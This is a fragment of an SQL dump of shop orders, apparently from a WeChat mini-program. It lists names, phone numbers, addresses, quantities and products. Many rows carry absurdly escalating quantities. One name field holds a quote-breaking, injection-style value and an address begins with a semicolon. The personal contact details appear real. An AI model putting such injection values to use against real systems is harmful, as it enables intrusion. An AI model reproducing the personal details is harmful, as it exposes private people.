15:09:08'),(29,'o0fkt42KeHftEXD1tNIeJRwqKa-c','徐鹤翔','17703175244','北京市北京市昌平区','7#233',233,1,2,'卫生纸','2021-09-27 11:44:25'),(30,'o0fkt42KeHftEXD1tNIeJRwqKa-c','徐鹤翔','17703175244','北京市北京市昌平区','7#233',233,1,2,'卫生纸','2021-09-27 11:44:28'),(31,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',1631,7,2,'卫生纸','2021-09-27 13:28:48'),(32,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2796,12,2,'卫生纸','2021-09-27 13:28:50'),(33,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2796,12,2,'卫生纸','2021-09-27 13:28:50'),(34,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2796,12,2,'卫生纸','2021-09-27 13:28:51'),(35,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2796,12,2,'卫生纸','2021-09-27 13:28:51'),(36,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2796,12,2,'卫生纸','2021-09-27 13:28:51'),(37,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2796,12,2,'卫生纸','2021-09-27 13:28:51'),(38,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',543589,2333,2,'卫生纸','2021-09-27 13:29:05'),(39,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:33'),(40,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:33'),(41,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:33'),(42,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:33'),(43,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:33'),(44,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:34'),(45,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:34'),(46,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:34'),(47,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:34'),(48,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:35'),(49,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:35'),(50,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:35'),(51,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:37'),(52,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:38'),(53,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:38'),(54,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:38'),(55,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:38'),(56,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:40'),(57,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:46'),(58,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:49'),(59,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23067,99,2,'卫生纸','2021-09-27 13:29:51'),(60,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',232767,999,2,'卫生纸','2021-09-27 13:29:55'),(61,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',232767,999,2,'卫生纸','2021-09-27 13:29:57'),(62,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',232767,999,2,'卫生纸','2021-09-27 13:30:01'),(63,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:06'),(64,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:11'),(65,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:13'),(66,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:18'),(67,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:22'),(68,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:22'),(69,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:23'),(70,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:23'),(71,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:23'),(72,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:23'),(73,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:23'),(74,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:23'),(75,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:24'),(76,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:24'),(77,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:24'),(78,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:24'),(79,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:24'),(80,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:25'),(81,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:25'),(82,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:25'),(83,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:25'),(84,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:25'),(85,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:25'),(86,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:26'),(87,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:26'),(88,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:26'),(89,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:26'),(90,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:26'),(91,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:26'),(92,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:27'),(93,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:27'),(94,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:27'),(95,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:27'),(96,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:27'),(97,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:27'),(98,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:28'),(99,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:28'),(100,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:28'),(101,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:28'),(102,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:28'),(103,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:28'),(104,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:29'),(105,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:29'),(106,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:29'),(107,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:29'),(108,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:29'),(109,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:30'),(110,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:30'),(111,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:30'),(112,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:30'),(113,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:30'),(114,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:30'),(115,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:31'),(116,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:31'),(117,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:31'),(118,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:31'),(119,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:31'),(120,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:31'),(121,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:32'),(122,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:32'),(123,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:32'),(124,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:32'),(125,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:32'),(126,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:33'),(127,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:33'),(128,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:37'),(129,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:37'),(130,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:37'),(131,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:37'),(132,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:37'),(133,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:37'),(134,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:38'),(135,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:38'),(136,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:38'),(137,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:38'),(138,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:38'),(139,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',2329767,9999,2,'卫生纸','2021-09-27 13:30:38'),(140,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299767,99999,2,'卫生纸','2021-09-27 13:31:09'),(141,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299767,99999,2,'卫生纸','2021-09-27 13:31:12'),(142,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299767,99999,2,'卫生纸','2021-09-27 13:31:18'),(143,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299767,99999,2,'卫生纸','2021-09-27 13:31:19'),(144,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299767,99999,2,'卫生纸','2021-09-27 13:31:19'),(145,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299767,99999,2,'卫生纸','2021-09-27 13:31:19'),(146,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299534,99998,2,'卫生纸','2021-09-27 13:31:22'),(147,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299534,99998,2,'卫生纸','2021-09-27 13:31:22'),(148,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299534,99998,2,'卫生纸','2021-09-27 13:31:22'),(149,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299534,99998,2,'卫生纸','2021-09-27 13:31:23'),(150,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299534,99998,2,'卫生纸','2021-09-27 13:31:23'),(151,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299534,99998,2,'卫生纸','2021-09-27 13:31:23'),(152,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299534,99998,2,'卫生纸','2021-09-27 13:31:24'),(153,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299534,99998,2,'卫生纸','2021-09-27 13:31:25'),(154,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299534,99998,2,'卫生纸','2021-09-27 13:31:27'),(155,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299767,99999,2,'卫生纸','2021-09-27 13:31:29'),(156,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299767,99999,2,'卫生纸','2021-09-27 13:31:31'),(157,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299767,99999,2,'卫生纸','2021-09-27 13:31:33'),(158,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','北京市北京市昌平区南口镇南涧路29号','阿巴阿巴',23299767,99999,2,'卫生纸','2021-09-27 13:31:36'),(159,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',233,1,2,'卫生纸','2021-09-30 09:00:46'),(160,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',233,1,2,'卫生纸','2021-10-05 14:55:10'),(161,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',66,1,1,'单片机','2021-10-05 14:57:57'),(162,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',66,1,1,'单片机','2021-10-05 14:59:15'),(163,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',466,2,2,'卫生纸','2021-10-05 15:00:19'),(164,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',233,1,2,'卫生纸','2021-10-05 15:01:13'),(165,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7@3',233,1,2,'卫生纸','2021-10-06 02:42:27'),(166,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7@3',233,1,2,'卫生纸','2021-10-06 02:43:04'),(167,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7@3',528,8,1,'单片机','2021-10-06 02:48:30'),(168,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7@3',66,1,1,'单片机','2021-10-06 02:49:04'),(169,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7@3',66,1,1,'单片机','2021-10-06 02:50:47'),(170,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7@3',66,1,1,'单片机','2021-10-06 02:51:00'),(171,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7@3',66,1,1,'单片机','2021-10-06 02:53:06'),(172,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7@3',5592,24,2,'卫生纸','2021-10-06 02:53:29'),(173,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','徐鹤翔\";char\"','13465870921','北京市北京市朝阳区和平里西街3号',';北京化工大学昌平新校区',330,5,1,'单片机','2021-10-06 